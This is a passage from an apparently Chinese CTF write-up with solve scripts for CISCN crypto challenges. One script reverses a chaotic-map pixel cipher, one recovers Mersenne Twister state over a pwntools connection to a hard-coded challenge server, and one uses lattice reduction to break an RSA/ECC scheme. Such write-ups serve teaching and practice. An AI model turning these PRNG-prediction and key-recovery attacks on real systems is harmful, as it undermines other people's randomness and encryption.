class="built_in">print</span>(i,generate(data[i],r),data[i+<span class="number">1</span>],(generate(data[i],r)-data[i+<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">r = get_r(x_list)</span><br><span class="line">x0 = <span class="number">0.840264</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pixel,key1,key2,x0,m,n</span>):</span><br><span class="line">    num = m*n//<span class="number">8</span>    </span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x,r)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix </span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">finalplain = encrypt(cipher2,key1,key2,x0,<span class="number">24</span>,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br><span class="line"><span class="built_in">print</span>(finalplain)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[136, 62, 185, 178, 49, 197, 213, 2, 251, 5, 178, 24, 142, 87, 151, 2, 198, 218, 15, 151, 74, 80, 235, 156, 39, 95, 35, 98, 83, 221, 45, 106, 103, 2, 216, 120, 68, 182, 140, 224, 170, 154, 117, 191, 170, 103, 98, 118, 58, 46, 175, 128, 240, 52, 228, 101, 247, 177, 125, 39, 101, 154, 246, 39, 100, 251, 244, 23, 23, 71, 172, 145, 123, 174, 79, 243, 61, 143, 24, 25, 144, 118, 181, 126, 49, 237, 182, 20, 115, 42, 36, 80, 0, 21, 255, 191, 152, 172, 240, 174, 101, 91, 57, 62, 187, 207, 82, 46, 238, 234, 4, 164, 171, 142, 128, 132, 234, 26, 105, 153, 165, 30, 167, 76, 203, 232, 218, 82, 247, 214, 247, 15, 8, 156, 139, 27, 3, 180, 224, 252, 194, 158, 77, 178, 248, 136, 193, 247, 92, 55, 196, 189, 67, 35, 185, 48, 215, 179, 179, 225, 132, 148, 9, 138, 103, 227, 140, 61, 89, 217, 229, 99, 215, 63, 100, 133, 222, 139, 81, 15, 149, 236, 168, 7, 102, 176, 173, 240, 149, 70, 244, 23, 243, 248, 208, 6, 156, 241, 12, 62, 45, 49, 136, 168, 187, 217, 70, 142, 94, 227, 122, 92, 209, 177, 195, 217, 218, 105, 41, 157, 66, 119, 67, 31, 130, 120, 52, 32, 18, 49, 34, 17, 145, 170, 89, 38, 27, 102, 52, 42, 65, 161, 182, 114, 194, 205, 16, 53, 139, 167, 115, 92, 87, 210, 95, 44]</span></span><br><span class="line"><span class="string">[136, 62, 185, 178, 49, 197, 213, 2, 251, 5, 178, 24, 142, 87, 151, 2, 198, 218, 15, 151, 74, 80, 235, 156, 39, 95, 35, 98, 83, 221, 45, 106, 103, 2, 216, 120, 68, 182, 140, 224, 170, 154, 117, 191, 170, 103, 98, 118, 58, 46, 175, 128, 240, 52, 228, 101, 247, 177, 125, 39, 101, 154, 246, 39, 100, 251, 244, 23, 23, 71, 172, 145, 123, 174, 79, 243, 61, 143, 24, 25, 144, 118, 181, 126, 49, 237, 182, 20, 115, 42, 36, 80, 0, 21, 255, 191, 152, 172, 240, 174, 101, 91, 57, 62, 187, 207, 82, 46, 238, 234, 4, 164, 171, 142, 128, 132, 234, 26, 105, 153, 165, 30, 167, 76, 203, 232, 218, 82, 247, 214, 247, 15, 8, 156, 139, 27, 3, 180, 224, 252, 194, 158, 77, 178, 248, 136, 193, 247, 92, 55, 196, 189, 67, 35, 185, 48, 215, 179, 179, 225, 132, 148, 9, 138, 103, 227, 140, 61, 89, 217, 229, 99, 215, 63, 100, 133, 222, 139, 81, 15, 149, 236, 168, 7, 102, 176, 173, 240, 149, 70, 244, 23, 243, 248, 208, 6, 156, 241, 12, 62, 45, 49, 136, 168, 187, 217, 70, 142, 94, 227, 122, 92, 209, 177, 195, 217, 218, 105, 41, 157, 66, 119, 67, 31, 130, 120, 52, 32, 18, 49, 34, 17, 145, 170, 89, 38, 27, 102, 52, 42, 65, 161, 182, 114, 194, 205, 16, 53, 139, 167, 115, 92, 87, 210, 95, 44, 210, 63, 158, 223, 183, 161, 91, 36, 201, 53, 92, 222, 105, 246, 80, 94, 170, 10, 132, 110, 0, 151, 77, 91, 209, 110, 100, 206, 195, 88, 103, 183, 7, 98, 163, 42, 44, 115, 82, 184, 200, 122, 56, 188, 106, 159, 221, 166, 213, 81, 162, 64, 116, 213, 43, 32, 5, 223, 135, 182, 64, 54, 111, 218, 126, 75, 92, 205, 231, 15, 8, 66, 34, 52, 115, 246, 96, 227, 92, 211, 76, 204, 217, 20, 239, 144, 139, 90, 136, 142, 197, 83, 43, 96, 248, 76, 17, 70, 13, 49, 18, 69, 95, 31, 198, 181, 32, 119, 253, 42, 73, 70, 106, 29, 38, 20, 232, 108, 244, 219, 72, 144, 109, 146, 32, 250, 83, 99]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,finalplain))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">flag = <span class="string">&quot;CISCN&#123;&quot;</span>+md5.new(data).hexdigest()+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="homo"><a href="#homo" class="headerlink" title="homo"></a>homo</h4><p>拿312次随机数，就能还原<code>states</code>，接着预判接下来的200次<code>win</code>了之后即可<code>decrypt</code>，由于系数不能完全相同，给其加上个模数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> poly <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;124.71.229.150&quot;</span>, <span class="string">&quot;23474&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_coefficient</span>():</span><br><span class="line">    data = r.recvline(<span class="literal">False</span>).strip().decode()[<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">    coefficient = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        coefficient.append(<span class="built_in">int</span>(i))</span><br><span class="line">    <span class="keyword">return</span> coefficient</span><br><span class="line"></span><br><span class="line">q = <span class="number">2</span>**<span class="number">54</span></span><br><span class="line">n = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">data1 = get_coefficient()</span><br><span class="line">data2 = get_coefficient()</span><br><span class="line">data3 = get_coefficient()</span><br><span class="line">data4 = get_coefficient()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RightXor</span>(<span class="params">value,shift,bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RightXorMasked</span>(<span class="params">value,shift,mask,bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LeftXor</span>(<span class="params">value, shift,bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &lt;&lt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LeftXorMasked</span>(<span class="params">value, shift, mask,bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_state</span>(<span class="params">x</span>):</span><br><span class="line">    x = RightXor(x,<span class="number">18</span>)</span><br><span class="line">    x = LeftXorMasked(x,<span class="number">15</span>,<span class="number">4022730752</span>)</span><br><span class="line">    x = LeftXorMasked(x,<span class="number">7</span>,<span class="number">2636928640</span>)</span><br><span class="line">    x = RightXor(x,<span class="number">11</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_game</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;2.decrypt\n\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    my_states = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">        r.recvuntil(<span class="string">&quot;your number:&quot;</span>)</span><br><span class="line">        r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">&quot;my number is &quot;</span>)</span><br><span class="line">        num = <span class="built_in">bin</span>(<span class="built_in">int</span>(r.recvline(<span class="literal">False</span>).strip().decode()))[<span class="number">2</span>:]</span><br><span class="line">        num1,num2 = <span class="built_in">int</span>(num[-<span class="number">32</span>:],<span class="number">2</span>),<span class="built_in">int</span>(num[:-<span class="number">32</span>],<span class="number">2</span>)</span><br><span class="line">        my_states.append(get_state(num1))</span><br><span class="line">        my_states.append(get_state(num2))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(my_states) == <span class="number">624</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my_states ready!&quot;</span>)</span><br><span class="line">    my_random = Random()</span><br><span class="line">    my_random.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(my_states+[<span class="number">0</span>]),<span class="literal">None</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">        my_random.getrandbits(<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        r.recvuntil(<span class="string">&quot;your number:&quot;</span>)</span><br><span class="line">        x = my_random.getrandbits(<span class="number">64</span>)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">        r.recvline(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">play_game()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Win!&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;2.decrypt\n\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;c0:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data3)-<span class="number">1</span>):</span><br><span class="line">    r.send(<span class="built_in">str</span>(data3[i])+<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(data3[-<span class="number">1</span>]+q))</span><br><span class="line">r.recvuntil(<span class="string">&quot;c1:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data4)-<span class="number">1</span>):</span><br><span class="line">    r.send(<span class="built_in">str</span>(data4[i])+<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(data4[-<span class="number">1</span>]+q))</span><br><span class="line"></span><br><span class="line">finaldata = r.recvline(<span class="literal">False</span>).strip().decode()[<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> finaldata:</span><br><span class="line">    flag += i</span><br><span class="line">flag = <span class="built_in">int</span>(flag,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="move"><a href="#move" class="headerlink" title="move"></a>move</h4><p>根据题目有 $ex-yn&#x3D;y(p+q+1)-z$，且发现 $e$ 和 $N$ 比较小那么就可以造格子进行格基规约,这样就能求出 $x$ 和 $y&#x3D;ex&#x2F;&#x2F;n$ 那么余数<br>$$<br>\begin{aligned}<br>k&amp;&#x3D;y(p+q+1)-z\\<br>&amp;&#x3D;ex-ynk \\<br>&amp;&#x3D; y(p+q+1)-z \\<br>&amp;&#x3D; y(p+q+1) - zbound - ((p + 1)(q + 1)y - zbound)\mod x \\<br>&amp;&#x3D; y(p+q+1) + int(\frac{((p-q)y\cdot round(n^{0.25}))}{(3(p + q))}) - ((p + 1)(q + 1)y - zbound)\mod x \\<br>&amp;&#x3D;y((p+q+1) + \frac{(p-q)\cdot round(n^{0.25}))}{(3(p + q))}<br>\end{aligned}<br>$$<br>所以 $k$ 整除 $y$ ，这里我们设 $K&#x3D;\frac{k}{y}&#x3D;\frac{(p+q+1) + ((p-q)\cdot round(n^{0.25}))}{(3*(p + q))}$ 我们设 $s&#x3D;p+q$ ，则 $p-q&#x3D;\frac{3s(K-1-s)}{round(n^{0.25})}$ ，根据 $(p+q)^2-(p-q)^2&#x3D;4n$ ，二分即可找到 $s$ ，接着算出 $d$ ，在ECC上进行标量乘法即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">p1, p2</span>):</span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">n, p</span>):</span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">M = Matrix(ZZ,[[<span class="number">2</span>**<span class="number">512</span>,e],[<span class="number">0</span>,-n]])</span><br><span class="line">A = M.LLL()[<span class="number">0</span>]</span><br><span class="line">x = A[<span class="number">0</span>]&gt;&gt;<span class="number">512</span></span><br><span class="line"><span class="built_in">print</span>((e*x-A[<span class="number">1</span>])//n)</span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">n = <span 